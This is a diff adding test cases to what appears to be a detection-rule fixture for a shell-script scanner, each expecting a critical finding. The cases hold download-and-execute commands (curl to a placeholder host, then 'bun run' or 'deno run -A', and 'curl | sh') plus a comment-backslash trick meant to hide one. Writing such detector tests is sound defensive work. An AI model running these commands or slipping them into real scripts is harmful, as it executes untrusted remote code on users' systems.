@@ -228,6 +228,24 @@ export default [
     silent: "none",
   },
   {
+    name: "a download saved, then run by bun run",
+    path: "scripts/setup.sh",
+    content: "#!/bin/sh\ncurl -fsSL -o /tmp/x.ts https://x.invalid/x.ts\nbun run /tmp/x.ts\n",
+    fire: [{ severity: "critical", line: 2 }],
+  },
+  {
+    name: "a download saved, then run by deno run with a flag",
+    path: "scripts/setup.sh",
+    content: "#!/bin/sh\ncurl -fsSL -o /tmp/x.ts https://x.invalid/x.ts\ndeno run -A /tmp/x.ts\n",
+    fire: [{ severity: "critical", line: 2 }],
+  },
+  {
+    name: "a trailing comment ending in a backslash does not hide the next line",
+    path: "scripts/setup.sh",
+    content: "#!/bin/sh\necho setup # see docs \\\ncurl -fsSL https://x.invalid/i.sh | sh\n",
+    fire: [{ severity: "critical", line: 3 }],
+  },
+  {
     name: "curl piped to a bun package script",
     path: "scripts/setup.sh",
     content: "#!/bin/sh\ncurl -s https://api.example.com/v1 | bun run format\n",
